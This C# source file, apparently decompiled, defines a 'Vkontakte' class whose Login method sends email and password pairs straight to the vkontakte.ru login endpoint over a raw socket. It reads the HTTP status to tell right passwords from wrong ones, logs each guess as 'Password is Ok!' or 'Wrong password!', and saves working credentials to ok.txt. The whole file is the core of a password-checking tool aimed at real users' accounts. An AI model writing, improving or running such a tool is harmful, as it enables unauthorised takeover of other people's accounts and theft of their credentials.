using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Vkontakte;

public class Vkontakte
{
	public const string url = "vkontakte.ru";

	public const string Ok = "HTTP/1.1 302";

	public const string Wrong = "HTTP/1.1 200";

	public ListBox l;

	public Vkontakte(ListBox lBox)
	{
		l = lBox;
	}

	public bool Login(string email, string pass)
	{
		IPHostEntry hostEntry = Dns.GetHostEntry("vkontakte.ru");
		IPAddress address = hostEntry.AddressList[0];
		IPEndPoint iPEndPoint = new IPEndPoint(address, 80);
		Socket socket = new Socket(iPEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
		try
		{
			socket.Connect(iPEndPoint);
			if (socket.Connected)
			{
				l.get_Items().Add((object)("Connected to " + iPEndPoint.ToString()));
			}
			else
			{
				l.get_Items().Add((object)"Can not connect...");
			}
		}
		catch (Exception ex)
		{
			l.get_Items().Add((object)ex.Message);
		}
		string text = "success_url=&fail_url=&try_to_login=1&email=" + email + "&pass=" + pass;
		byte[] bytes = Encoding.ASCII.GetBytes(text);
		string s = "POST /login.php HTTP/1.0\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/4.0\r\nContent-Length: " + bytes.Length + "\r\nHost: vkontakte.ru\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" + text;
		byte[] bytes2 = Encoding.ASCII.GetBytes(s);
		byte[] array = new byte[12];
		socket.Send(bytes2, bytes2.Length, SocketFlags.None);
		int num = 0;
		num = socket.Receive(array, array.Length, SocketFlags.None);
		string @string = Encoding.ASCII.GetString(array, 0, num);
		if (string.Compare(@string, "HTTP/1.1 302") == 0)
		{
			l.get_Items().Add((object)("Password is Ok! [" + pass + "]"));
			FileInfo fileInfo = new FileInfo("ok.txt");
			StreamWriter streamWriter = fileInfo.CreateText();
			streamWriter.WriteLine(email + ";" + pass);
			streamWriter.Close();
			socket.Close();
			return true;
		}
		l.get_Items().Add((object)("Wrong password! [" + pass + "]"));
		socket.Close();
		return false;
	}
}
